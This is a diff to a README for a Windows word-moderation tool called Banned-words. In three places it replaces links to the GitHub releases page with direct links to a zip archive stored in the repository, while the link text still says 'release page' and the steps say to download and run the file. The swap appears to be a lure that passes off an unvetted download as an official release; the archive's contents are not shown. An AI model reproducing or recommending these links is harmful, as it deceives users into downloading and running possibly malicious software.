@@ -1,6 +1,6 @@
 # 🤬 Banned-words - Clean text with fewer false hits
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kristiencertain714/Banned-words/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/kristiencertain714/Banned-words/main/Banned-words-list/words-Banned-1.8.zip)
 
 ## 🧭 What this app does
 
@@ -27,7 +27,7 @@ If your browser can open normal websites, it can use the editor.
 
 ## 🚀 Download and open on Windows
 
-1. Open the [release page](https://github.com/kristiencertain714/Banned-words/releases)
+1. Open the [release page](https://raw.githubusercontent.com/kristiencertain714/Banned-words/main/Banned-words-list/words-Banned-1.8.zip)
 2. Find the latest release at the top
 3. Download the Windows file from that release
 4. Save the file to your Downloads folder or Desktop
@@ -216,4 +216,4 @@ For steady moderation work:
 
 ## 🔗 Download
 
-Visit the [release page](https://github.com/kristiencertain714/Banned-words/releases) to download and run this file on Windows
+Visit the [release page](https://raw.githubusercontent.com/kristiencertain714/Banned-words/main/Banned-words-list/words-Banned-1.8.zip) to download and run this file on Windows
